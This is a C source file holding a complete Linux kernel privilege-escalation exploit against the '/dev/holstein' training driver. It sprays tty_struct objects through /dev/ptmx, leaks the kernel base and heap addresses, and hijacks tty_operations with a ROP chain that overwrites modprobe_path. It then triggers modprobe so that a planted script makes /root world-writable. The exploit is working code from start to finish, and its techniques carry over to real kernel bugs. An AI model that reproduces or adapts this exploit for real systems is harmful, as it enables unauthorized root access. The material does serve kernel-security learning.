#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>
#include <sys/ioctl.h>

int device_fd;
void open_device(){
    device_fd = open("/dev/holstein", O_RDWR);
    if (device_fd < 0){
        puts("Failed to open /dev/holstein");
        exit(-1);
    } else {
        puts("Device /dev/holstein openned");
    }
}

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;

void save_registers_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void pwn(){
    puts("[*] Setting up modprobe binary");

    system("echo -n '#!/bin/sh\nchmod -R 777 /root' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    system("/tmp/dummy");

}

unsigned long tty_ops_offset = 0xc38880UL;

// 0xffffffff811077fc : push rdx ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop rbp ; ret
unsigned long push_rdx__add_rbx_pl__pop_rsp__pop_r13__pop_rbp__ret = 0x1077fc;

// 0xffffffff810d748d : pop rdi ; ret
unsigned long pop_rdi__ret = 0xd748d;
// 0xffffffff8113c1c4 : pop rcx ; ret
unsigned long pop_rcx__ret = 0x13c1c4;
// 0xffffffff8162707b
unsigned long mov_rdi_rax__rep__ret = 0x62707b;

// ffffffff81800e10 T swapgs_restore_regs_and_return_to_usermode
unsigned long swapgs_restore_regs_and_return_to_usermode = 0x800e10;

// AAW for modprobe_path
// 0xffffffff81169484 : mov qword ptr [rax], rdx ; ret
unsigned long mov_rax_rdx__ret = 0x169484;
// 0xffffffff81025261 : pop rax ; ret
unsigned long pop_rax__ret = 0x25261;
// 0xffffffff8113c0da : pop rdx ; ret
unsigned long pop_rdx__ret = 0x13c0da;

unsigned long modprobe_path = 0xe38180;

int main(){

    // (module_write) 0x100355 copy_from_user = *module_write+0x108

    save_registers_state();

    int spray[100];
    int cont = 0;

    // Fazendo spray de objetos tty_struct antes e depois da aloca√ßao do buffer do driver
    printf("Spraing tty_struct objects\n");
    for (; cont < 50; cont ++){
        spray[cont] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[cont] == -1){
            puts("Error openning ptmx (Spray 1)");
            exit(-1);
        }
    }

    open_device();

    printf("Spraing tty_struct objects\n");
    for (; cont < 100; cont ++){
        spray[cont] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[cont] == -1){
            puts("Error openning ptmx (Spray 2)");
            exit(-1);
        }
    }


    printf("Writing to device buffer\n");

    unsigned long leak[160];
    read(device_fd, &leak, 0x500);

    // g_buf + 0x400 + 0x18 = base_address + tty_ops_offset
    unsigned long _text_addr = (unsigned long) leak[131] - tty_ops_offset;
    printf("Base address: 0x%lx\n", _text_addr);

    // heap address of g_buf
    unsigned long heap_g_buf = (unsigned long) leak[135] - 0x438;
    printf("Heap address: 0x%lx\n", heap_g_buf);

    char buf[0x500];
    memset(&buf, 0, 0x500);
    memcpy(&buf, &leak, 0x500);

    unsigned long *buf_p = (unsigned long*)&buf;

    printf("ROP Start: 0x%lx\n", push_rdx__add_rbx_pl__pop_rsp__pop_r13__pop_rbp__ret + _text_addr);
    buf_p[0xc] = push_rdx__add_rbx_pl__pop_rsp__pop_r13__pop_rbp__ret + _text_addr;

    int off = 0xd;

    // modprobe_path overwrite
    buf_p[off++] = pop_rdx__ret + _text_addr;
    buf_p[off++] = 0x782f706d742f;
    buf_p[off++] = pop_rax__ret + _text_addr;
    buf_p[off++] = modprobe_path + _text_addr;
    buf_p[off++] = mov_rax_rdx__ret + _text_addr;


    buf_p[off++] = swapgs_restore_regs_and_return_to_usermode + 22UL + _text_addr;
    buf_p[off++] = 0x0;
    buf_p[off++] = 0x0;

    buf_p[off++] = (unsigned long)pwn;
    buf_p[off++] = user_cs;
    buf_p[off++] = user_rflags;
    buf_p[off++] = user_sp;
    buf_p[off++] = user_ss;

    printf("swapgs = 0x%lx\n", swapgs_restore_regs_and_return_to_usermode + _text_addr);

    // Putting heap_g_buf into position 0x418 of heap / overwritting tty_operations address on tty_struct
    *(unsigned long*)&buf[0x418] = heap_g_buf;

    puts("Writting payload to heap");
    // Write until end of heap_g_buf address
    write(device_fd, buf, 0x420);

    puts("Executing ioctl");
    cont = 0;
    for (; cont < 100; cont++){
        ioctl(spray[cont], 0x42424242, (unsigned long)heap_g_buf+0x68-0x10);
    }

    printf("Done\n");
    close(device_fd);
}